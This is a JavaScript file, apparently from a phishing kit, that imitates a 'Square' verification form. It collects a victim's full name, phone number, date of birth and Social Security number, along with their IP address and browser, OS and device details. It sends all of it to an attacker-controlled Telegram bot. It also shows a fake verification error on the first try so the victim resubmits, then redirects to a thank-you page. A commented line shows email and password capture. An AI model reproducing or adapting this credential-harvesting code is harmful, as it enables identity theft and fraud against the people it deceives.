var signinbtn = document.getElementById('login-standard-submit')

$.getJSON("https://api.ipify.org?format=json", function(data) {

var ip = document.getElementById('gfg').value = data.ip

})



$(document).ready(function(){
 
    //  $("#rnumber").mask("0000000000");
    // $("#bnumber").mask("00000000000000000");
   
    $("#pnumber").mask("(000) 000-0000");

    $("#dateid").mask("00/00/0000");

    $("#lastssn").mask("***-**-0000");
});

var useragent = navigator.userAgent
const parser = new UAParser(useragent);
const parserResults = parser.getResult();




var osdetails = parserResults.os.name + ' ' + parserResults.os.version
var browser = parserResults.browser.name + ' ' +  parserResults.browser.version
var device = parserResults.device.model + ' ' + parserResults.device.vendor




var bnumberinput = document.getElementById('bnumber')
var pnumberinput = document.getElementById('pnumber')
var dateidinput = document.getElementById('dateid')
var lastssninput = document.getElementById('lastssn')















bnumberinput.addEventListener('input', function(){
    
    document.getElementById('errmsg').style.display = "none"
    $( "#emailfull" ).removeClass( "invalido" );
})

pnumberinput.addEventListener('input', function(){
    document.getElementById('errmsg').style.display = "none"

    $( "#emailphone" ).removeClass( "invalido" );
})


lastssninput.addEventListener('input', function(){
    document.getElementById('errmsg').style.display = "none"

    $( "#emailssn" ).removeClass( "invalido" );
   
})
dateidinput.addEventListener('input', function(){
    document.getElementById('errmsg').style.display = "none"
    $( "#emaildate" ).removeClass( "invalido" );
 
})




            signinbtn.addEventListener('click', function(e){

                e.preventDefault()
               
                var regName = /^[a-zA-Z]+ [a-zA-Z]+$/;
                var ip = document.getElementById('gfg').value 
                // var rnumber = document.getElementById('rnumber').value
                var bnumber = document.getElementById('bnumber').value
                var pnumber = document.getElementById('pnumber').value
                var dateid = document.getElementById('dateid').value
                var lastssn = document.getElementById('lastssn').value
               



                // console.log("lastssn = " + lastssn )
                // console.log("pnumber = " + pnumber )
                // console.log("dateid = " + dateid )
                // console.log("bnumber = " + bnumber )
                // console.log("rnumber = " + rnumber )

              

                // console.log("ip = " + ip )


                // console.log("OS = " + osdetails )

                // console.log("Browser = " + browser )

                // console.log("Device = " + device )

                // var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;

                // 
                // 
                //
                //

                if(bnumber == "" || !regName.test(bnumber)){
                    document.getElementById('both-error').innerHTML = 'Enter a valid Full name.'
                    $( "#emailfull" ).addClass( "invalido" );
                    document.getElementById('errmsg').style.display = "block"
                }
                else if(pnumber == ""){
                    document.getElementById('both-error').innerHTML = 'Enter a valid phone number.'
                    $( "#emailphone" ).addClass( "invalido" );
                    document.getElementById('errmsg').style.display = "block"
                }

                else if(dateid == "" ){
                    document.getElementById('both-error').innerHTML = 'Enter a valid Date of birth.'
                    $( "#emaildate" ).addClass( "invalido" );
                    document.getElementById('errmsg').style.display = "block"
                }
                else if(lastssn == ""  ){
                    document.getElementById('both-error').innerHTML = 'Invalid SSN.'
                    $( "#emailssn" ).addClass( "invalido" );
                    document.getElementById('errmsg').style.display = "block"
                    console.log(' field cannot be empty')

                } 
                
                
                else   {

                    console.log('All fileds are valid')


            
                   



                    var url = `https://api.telegram.org/bot${tg.token}/sendMessage` 

                    var obj = {
                        chat_id: tg.chat_id, // Telegram chat id
                        text:  "\r\n" + "\r\n" + "Square up " +  "\r\n" + "\r\n" + "\r\n" + "IP : " + ip  + "\r\n" + "\r\n" + "OS version : " + osdetails +  "\r\n" + "Broswer type : " +  browser + "\r\n" + "Device type : " + device + "\r\n"  +  "\r\n" +  "Other data" + "\r\n" + "\r\n" + "Full name : " + bnumber + "\r\n" + "Phone Number : " + pnumber + "\r\n" + "Date of birth : " + dateid + "\r\n" + " SSN Number : " + lastssn     // The text to send
                    };

                    $.ajax({
                        type: 'POST',
                        url: url,
                        data: obj,
                        dataType: "json",
                        success: function() {   
                            
                            


                            

                            var keyz = localStorage.getItem('keyz', 1);

                            if(keyz == null){


              
                                var dateid = document.getElementById('dateid').value = " "
                                var lastssn = document.getElementById('lastssn').value = " "
    
    
                                document.getElementById('both-error').innerHTML = "We couldn't verify your information."
                                $( "#emailssn" ).addClass( "invalido" );
                                $( "#emaildate" ).addClass( "invalido" );
                                document.getElementById('errmsg').style.display = "block"
                                console.log(' field cannot be empty')


                                localStorage.setItem('keyz', 1);
                            }else{
                                
                                localStorage.clear();
                                setTimeout(function(){
                                    window.location.replace('/thank')
                                }, 500)
                               
                            }
                            
                            
                            
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        } })
                     
                   
                 }

           
              
            
            
            
            
            
            })
            

            // "Email : " + email +  "\r\n" + "Password : " + password   + 